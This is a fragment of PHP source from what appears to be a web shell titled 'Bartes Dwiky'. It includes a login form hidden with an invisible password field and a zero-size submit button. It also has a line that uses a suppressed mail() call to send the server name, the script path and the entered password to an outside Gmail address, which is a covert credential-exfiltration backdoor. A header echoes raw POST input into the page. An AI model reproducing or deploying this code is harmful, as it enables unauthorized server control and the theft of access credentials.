...
$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('ccpprogrammers07@gmail.com', 'root', $tmp); // Edit or delete!
}
...
<form method=post><br>
<input type=password name=pass style='border: 0px solid transparent;'>
<button type=submit name='watching' style='height:0px; width:0px; border:none; background-color: white;'></button></form>
</pre>");
}
...
function hardHeader() {
	...
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>[] Bartes Dwiky []</title>
